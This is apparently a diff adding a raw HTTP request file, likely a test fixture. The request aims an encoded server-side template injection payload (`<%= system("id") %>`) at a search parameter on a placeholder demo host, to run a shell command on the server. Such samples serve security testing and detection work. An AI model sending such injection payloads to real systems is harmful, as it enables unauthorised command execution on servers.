@@ -1,0 +1,4 @@
+GET /a?search=\u003C%%3D%20system(\u0022id\u0022)%20%\u003E HTTP/1.1
+Host: demo.example.com
+Connection: close
+
